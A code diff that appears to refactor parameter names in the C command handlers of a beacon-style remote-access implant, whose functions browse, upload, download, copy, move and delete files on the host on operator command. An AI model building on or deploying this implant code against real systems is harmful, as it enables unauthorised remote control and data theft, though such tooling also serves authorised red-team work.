@@ -93,7 +93,7 @@ char* listDirectory(char* dirPathStr, size_t* dirPathStrLen) {
     return resultStrchar;
 }
 
-unsigned char* CmdFileBrowse(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
+unsigned char* CmdFileBrowse(unsigned char* command, size_t command_length, size_t* msgLen) {
     formatp format;
     datap parser;
     int pendingRequest;
@@ -105,7 +105,7 @@ unsigned char* CmdFileBrowse(unsigned char* commandBuf, size_t commandBuflen, si
     }
 	memset(path, 0, MAX_FILENAME);
 
-    BeaconDataParse(&parser, commandBuf, commandBuflen);
+    BeaconDataParse(&parser, command, command_length);
     pendingRequest = BeaconDataInt(&parser);
     BeaconDataStringCopySafe(&parser, path, MAX_FILENAME);
 
@@ -147,7 +147,7 @@ unsigned char* CmdFileBrowse(unsigned char* commandBuf, size_t commandBuflen, si
     return postMsg;
 }
 
-unsigned char* CmdUpload(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen, unsigned char* mode) {
+unsigned char* CmdUpload(unsigned char* command, size_t command_length, size_t* msgLen, unsigned char* mode) {
     // 数据结构如下：
     // fileNameLength(4 Bytes) | fileName(fileNameLenngth Bytes) | fileContent(rest Bytes)
     datap parser;
@@ -159,9 +159,9 @@ unsigned char* CmdUpload(unsigned char* commandBuf, size_t commandBuflen, size_t
         return NULL;
     }
 
-    BeaconDataParse(&parser, commandBuf, commandBuflen);
+    BeaconDataParse(&parser, command, command_length);
     if (!BeaconDataStringCopySafe(&parser, fileName, 1024)) {
-		fprintf(stderr, "Failed to extract fileName from commandBuf\n");
+		fprintf(stderr, "Failed to extract fileName from command\n");
         return NULL;
     }
 
@@ -196,9 +196,9 @@ unsigned char* CmdUpload(unsigned char* commandBuf, size_t commandBuflen, size_t
     return postMsg;
 }
 
-unsigned char* CmdDrives(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
+unsigned char* CmdDrives(unsigned char* command, size_t command_length, size_t* msgLen) {
     datap parser;
-    BeaconDataParse(&parser, commandBuf, commandBuflen);
+    BeaconDataParse(&parser, command, command_length);
 
     formatp formatp;
     BeaconFormatAlloc(&formatp, 128);
@@ -254,14 +254,14 @@ unsigned char* CmdPwd(size_t* msgLen) {
     return lpcurrentPath;
 }
 
-unsigned char* CmdCd(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
-    char* targetWorkDirectory = (char*)malloc(commandBuflen + 1);
+unsigned char* CmdCd(unsigned char* command, size_t command_length, size_t* msgLen) {
+    char* targetWorkDirectory = (char*)malloc(command_length + 1);
     if (!targetWorkDirectory) {
         fprintf(stderr, "Memory allocation failed\n");
         return  NULL;
     }
-    memcpy(targetWorkDirectory, commandBuf, commandBuflen);
-    targetWorkDirectory[commandBuflen] = '\0';
+    memcpy(targetWorkDirectory, command, command_length);
+    targetWorkDirectory[command_length] = '\0';
     if (!SetCurrentDirectoryA(targetWorkDirectory)) {
         printf("SetCurrentDirectoryA failed with error:%lu\n", GetLastError());
         free(targetWorkDirectory);
@@ -270,7 +270,7 @@ unsigned char* CmdCd(unsigned char* commandBuf, size_t commandBuflen, size_t* ms
 
     const  char* prefix = "[*] Now work directory is ";
 
-    unsigned char* postMsg = (unsigned char*)malloc(strlen(prefix) + commandBuflen + 1);
+    unsigned char* postMsg = (unsigned char*)malloc(strlen(prefix) + command_length + 1);
 
     if (!postMsg) {
         fprintf(stderr, "Memory allocation failed\n");
@@ -279,17 +279,17 @@ unsigned char* CmdCd(unsigned char* commandBuf, size_t commandBuflen, size_t* ms
     }
 
     memcpy(postMsg, prefix, strlen(prefix));
-    memcpy(postMsg + strlen(prefix), targetWorkDirectory, commandBuflen);
+    memcpy(postMsg + strlen(prefix), targetWorkDirectory, command_length);
 
-    *msgLen = strlen(prefix) + commandBuflen;
-    postMsg[strlen(prefix) + commandBuflen] = '\0';
+    *msgLen = strlen(prefix) + command_length;
+    postMsg[strlen(prefix) + command_length] = '\0';
 
     return postMsg;
 }
 
-unsigned char* CmdMkdir(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
+unsigned char* CmdMkdir(unsigned char* command, size_t command_length, size_t* msgLen) {
     datap parser;
-    BeaconDataParse(&parser, commandBuf, commandBuflen);
+    BeaconDataParse(&parser, command, command_length);
 
     char* path = BeaconDataStringPointerCopy(&parser, 0x4000);
 
@@ -311,9 +311,9 @@ unsigned char* CmdMkdir(unsigned char* commandBuf, size_t commandBuflen, size_t*
     return postMsg;
 }
 
-unsigned char* CmdFileRemove(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
+unsigned char* CmdFileRemove(unsigned char* command, size_t command_length, size_t* msgLen) {
     datap parser;
-    BeaconDataParse(&parser, commandBuf, commandBuflen);
+    BeaconDataParse(&parser, command, command_length);
     char* path = BeaconDataStringPointerCopy(&parser, 0x4000);
 
     DWORD attributes = GetFileAttributesA((LPCSTR)path);
@@ -484,25 +484,25 @@ DWORD WINAPI downloadThread(LPVOID lpParam) {
     return TRUE;
 }
 
-VOID CmdFileDownload(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
+VOID CmdFileDownload(unsigned char* command, size_t command_length, size_t* msgLen) {
     struct FileThreadArgs* args = (struct FileThreadArgs*)malloc(sizeof(struct FileThreadArgs));
     if (!args) {
         fprintf(stderr, "Memory allocation failed\n");
         return;
     }
 
-    args->fileNameBuf = (char*)malloc(commandBuflen + 1);
+    args->fileNameBuf = (char*)malloc(command_length + 1);
     if (!args->fileNameBuf) {
         fprintf(stderr, "Memory allocation failed\n");
         free(args);
         return;
     }
     datap parser;
-    BeaconDataParse(&parser, commandBuf, commandBuflen);
+    BeaconDataParse(&parser, command, command_length);
 
-    memcpy(args->fileNameBuf, BeaconDataPtr(&parser, commandBuflen), commandBuflen);
-    args->fileNameBuf[commandBuflen] = '\0';
-    args->fileNameBufLen = commandBuflen;
+    memcpy(args->fileNameBuf, BeaconDataPtr(&parser, command_length), command_length);
+    args->fileNameBuf[command_length] = '\0';
+    args->fileNameBufLen = command_length;
 
     DWORD attributes = INVALID_FILE_ATTRIBUTES;
     if (args->fileNameBuf) {
@@ -542,14 +542,14 @@ VOID CmdFileDownload(unsigned char* commandBuf, size_t commandBuflen, size_t* ms
 
     CloseHandle(myThread);
 }
-unsigned char* CmdFileCopy(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
+unsigned char* CmdFileCopy(unsigned char* command, size_t command_length, size_t* msgLen) {
     // 数据包格式：existingFileNameLength(4 Bytes) | existingFileName(existingFileName Bytes) | newFileNameLength(4 Bytes) | newFileName(newFileNameLength Bytes)
     datap* pdatap = BeaconDataAlloc(MAX_EXISTING_FILENAME + MAX_NEW_FILENAME);
     char* existingFileName = BeaconDataPtr(pdatap, MAX_EXISTING_FILENAME);
     char* newFileName = BeaconDataPtr(pdatap, MAX_NEW_FILENAME);
 
     datap parser;
-    BeaconDataParse(&parser, commandBuf, commandBuflen);
+    BeaconDataParse(&parser, command, command_length);
     BeaconDataStringCopySafe(&parser, existingFileName, MAX_EXISTING_FILENAME);
     BeaconDataStringCopySafe(&parser, newFileName, MAX_NEW_FILENAME);
 
@@ -581,14 +581,14 @@ unsigned char* CmdFileCopy(unsigned char* commandBuf, size_t commandBuflen, size
     return postMsg;
 }
 
-unsigned char* CmdFileMove(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
+unsigned char* CmdFileMove(unsigned char* command, size_t command_length, size_t* msgLen) {
     // 数据包格式：existingFileNameLength(4 Bytes) | existingFileName(existingFileName Bytes) | newFileNameLength(4 Bytes) | newFileName(newFileNameLength Bytes)
 	datap* pdatap = BeaconDataAlloc(MAX_EXISTING_FILENAME + MAX_NEW_FILENAME);
     char* existingFileName = BeaconDataPtr(pdatap, MAX_EXISTING_FILENAME);
     char* newFileName = BeaconDataPtr(pdatap, MAX_NEW_FILENAME);
 
     datap parser;
-    BeaconDataParse(&parser, commandBuf, commandBuflen);
+    BeaconDataParse(&parser, command, command_length);
     BeaconDataStringCopySafe(&parser, existingFileName, MAX_EXISTING_FILENAME);
     BeaconDataStringCopySafe(&parser, newFileName, MAX_NEW_FILENAME);
     
